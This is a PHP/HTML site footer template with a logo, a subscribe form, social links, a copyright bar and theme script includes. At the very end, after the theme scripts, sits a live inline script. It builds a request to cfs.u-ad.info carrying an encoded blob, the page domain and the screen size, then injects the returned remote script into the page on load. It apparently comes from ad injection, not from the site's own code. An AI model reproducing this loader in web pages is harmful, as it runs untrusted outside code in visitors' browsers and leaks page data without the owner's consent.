<!-- Footer -->
		<footer id="footer">
		
			<div id="footer-widgets" class="container">
				<div class="row">
					<div class="col-md-8 col-md-offset-2">
					
						<a href="<?php echo base_url() ?>" class="footer-logo">
							<img src="<?php echo base_url('assets/upload/image/'.$site['logo']) ?>" class="logo"  alt="<?php echo $site['nameweb'] ?>" /></a>
						
						<p><?php echo $site['about'] ?></p>
					
					</div>
				</div>
				<div class="row">
					<div class="col-md-4 col-md-offset-4">
						
						<form class="subscribe-form" action="javascript:;" method="post">
							<input type="email" placeholder="Your Email Address..." />
							<input type="submit" />
						</form>
						
						<div class="social-icons">
							<a href="<?php echo $site['facebook'] ?>" target="_blank"><i class="fa fa-facebook"></i></a>
							<a href="<?php echo $site['twitter'] ?>" target="_blank"><i class="fa fa-twitter"></i></a>
							<a href="<?php echo $site['google_plus'] ?>" target="_blank"><i class="fa fa-google-plus"></i></a>
							<a href="<?php echo $site['pinterest'] ?>" target="_blank"><i class="fa fa-pinterest-p"></i></a>
						</div>
						
					</div>
				</div>
			</div>
			
			<div id="bottom-bar">
				<div class="container">
					<div class="row">
						<div class="col-md-12">
						
							<p>&copy;<?php echo date('Y') ?> <a href="<?php echo base_url() ?>"><?php echo $site['nameweb']?></a></p>
							<p>Designed by <a href="<?php echo base_url() ?>">Indo Media Solusi </a> / Developed by <a href="<?php echo base_url() ?>">Indo Media Solusi </a></p>
							<p> <a href="<?php echo base_url() ?>">Indo Media Solusi </a></p>
						
						</div>
					</div>
				</div>
			</div>
		
		</footer>
	
	</div>

	<!--
		Theme's JavaScript
		It is located at the bottom of the page to increase site's loading speed
	-->
	<!-- JQuery can be loaded from CDN, change SRC attribute into "//ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js" -->
	<script src="<?php echo base_url()?>assets/public/js/libs/jquery.min.js"></script>
	<!--
		Here we load all JS libs, packed into one single file to increase loading speed
		in case you need to load libraries one-by one or you need to remove one of them,
		see /js/libs/directory/, it contains all JS libs, used by theme 
	-->
	<script src="<?php echo base_url()?>assets/public/js/all_in_one_libs.min.js"></script>
	<script src="<?php echo base_url()?>assets/public/js/libs/jquery.dlmenu.js"></script>
    <script src="<?php echo base_url()?>assets/public/js/front.js"></script>
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582AaN6h071sG%2b5jiDvLTPqup5xyIT%2fGS0C8zoI%2fzA4pMbYDHJYABu%2bRDoHthnRYvwh6YBiANi0NKxvDk7nuzxEh6HBrGli8HoBIHCXbLOg8Yk036s6XYq7tyWvaJeTJaBtE9FSmvNIIgx7aYSMNSBGlSnyEIuKLVUWnsnEnRyrrXxNFgTijAlPYpufYsXL2cI5EjtSwJ8%2bQZqTE9B404hKiPql0T%2fsMnBATr%2fgvqd6xsJdnSrLlWleSMlRAzRzOCMuRtae%2byV3hEHXlK71qqKPpXnOPIBIR6miQ58xa0xl2V79Oc2dM8YimTwZHlQ3SJlyEbkFE%2fSbaqYwXCq5gRjPZrb9TNL8FqgSvQyUyaEDGlVjjF%2fvCNcJ2iL1r8M7n1qY4mRSBNWRta6140fEF05XSybqBMquSpYx%2fLZgM1Gzd9Tgi4CaBQgU1GmaPf1nMyU3rbLGVu2GD%2fjMgffNz%2f5AbrU6KWd%2bfQjqQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>


</body>
</html>